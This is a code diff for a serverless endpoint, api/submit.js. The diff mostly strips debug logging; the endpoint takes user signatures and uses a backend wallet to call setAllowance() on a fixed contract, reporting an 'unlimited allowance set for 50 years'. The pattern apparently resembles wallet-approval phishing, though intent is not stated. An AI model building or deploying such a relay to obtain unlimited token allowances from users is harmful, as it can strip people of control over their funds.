@@ -1,39 +1,38 @@
-// api/submit.js - Debug Version
+// api/submit.js
 const { ethers } = require('ethers');
 
 module.exports = async (req, res) => {
-    // Enable CORS
+    // CORS Headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    console.log('========================================');
-    console.log('📥 REQUEST RECEIVED');
-    console.log('📌 Method:', req.method);
-    console.log('📌 Headers:', req.headers);
-    console.log('========================================');
+    console.log('📥 Request received:', req.method);
 
     // Handle OPTIONS
     if (req.method === 'OPTIONS') {
-        console.log('✅ OPTIONS request handled');
         return res.status(200).end();
+    }
+
+    // GET request - Test
+    if (req.method === 'GET') {
+        return res.json({ 
+            status: 'OK', 
+            message: 'API is working!',
+            timestamp: new Date().toISOString()
+        });
     }
 
     // Only POST allowed
     if (req.method !== 'POST') {
-        console.log('❌ Method not allowed:', req.method);
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
     try {
-        console.log('📦 Request Body:', req.body);
-
         const { user, nonce, deadline, signature } = req.body;
 
         console.log('📥 Received from:', user);
         console.log('📝 Nonce:', nonce);
-        console.log('⏰ Deadline:', deadline);
-        console.log('📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');
 
         // ============================================
         // ⭐ CONFIG - Environment Variables
@@ -43,11 +42,6 @@ module.exports = async (req, res) => {
             privateKey: process.env.PRIVATE_KEY,
             contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837"
         };
-
-        console.log('🔧 CONFIG:');
-        console.log('  - rpcUrl:', CONFIG.rpcUrl ? '✅ Set' : '❌ Not Set');
-        console.log('  - privateKey:', CONFIG.privateKey ? '✅ Set' : '❌ Not Set');
-        console.log('  - contractAddress:', CONFIG.contractAddress);
 
         // Check if private key exists
         if (!CONFIG.privateKey) {
@@ -66,30 +60,19 @@ module.exports = async (req, res) => {
             });
         }
 
-        // ============================================
-        // ⭐ Initialize Provider and Wallet
-        // ============================================
-        console.log('⏳ Initializing provider...');
+        // Initialize provider and wallet
         const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
-        console.log('✅ Provider initialized');
-
-        console.log('⏳ Initializing wallet...');
         const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
         console.log('👛 Wallet address:', wallet.address);
 
-        // ============================================
-        // ⭐ Smart Contract Setup
-        // ============================================
+        // Contract ABI
         const contractABI = [
             "function setAllowance(address user, uint256 nonce, uint256 deadline, bytes calldata signature) external"
         ];
 
         const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);
-        console.log('✅ Contract initialized');
 
-        // ============================================
-        // ⭐ Submit Transaction
-        // ============================================
+        // ⭐ Submit transaction (Backend pays gas)
         console.log('⏳ Submitting setAllowance()...');
         console.log('⛽ Gas will be paid by:', wallet.address);
 
@@ -108,28 +91,18 @@ module.exports = async (req, res) => {
 
         console.log('✅ Transaction confirmed!');
         console.log('📦 Block:', receipt.blockNumber);
-        console.log('⛽ Gas Used:', receipt.gasUsed.toString());
 
-        // ============================================
-        // ⭐ Return Success Response
-        // ============================================
-        console.log('📤 Sending success response');
-        console.log('========================================');
-
+        // Return success response
         res.json({
             success: true,
             message: '✅ Unlimited allowance set for 50 years! Gas paid by backend.',
             txHash: tx.hash,
             blockNumber: receipt.blockNumber,
-            gasUsed: receipt.gasUsed.toString(),
             etherscanUrl: `https://etherscan.io/tx/${tx.hash}`
         });
 
     } catch (error) {
         console.error('❌ Error:', error.message);
-        console.error('📝 Stack:', error.stack);
-        console.log('========================================');
-        
         res.status(500).json({
             success: false,
             error: error.message
